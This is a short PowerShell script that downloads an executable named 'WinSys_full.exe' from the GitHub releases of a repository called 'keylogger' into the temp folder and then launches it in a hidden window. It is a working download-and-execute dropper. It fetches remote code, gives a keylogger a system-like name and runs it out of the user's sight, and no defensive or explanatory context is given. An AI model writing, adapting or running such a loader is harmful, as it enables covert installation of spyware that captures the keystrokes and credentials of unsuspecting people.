# Define variables
$repoOwner = "Su-nlight"                  # Replace with the repository owner
$repoName = "keylogger"                    # Replace with the repository name
$releaseTag = "v0.2.1-alpha"                # Replace with the desired release tag
$assetName = "WinSys_full.exe"            # Replace with the asset file name you want to download
$downloadUrl = "https://github.com/$repoOwner/$repoName/releases/download/$releaseTag/$assetName"

# Define paths
$tempFile = [System.IO.Path]::Combine($env:TEMP, $assetName)

# Download the file
Write-Output "Downloading $downloadUrl to $tempFile..."
Invoke-WebRequest -Uri $downloadUrl -OutFile $tempFile

# Execute the file with hidden window
Write-Output "Executing $tempFile..."
Start-Process $tempFile -WindowStyle Hidden
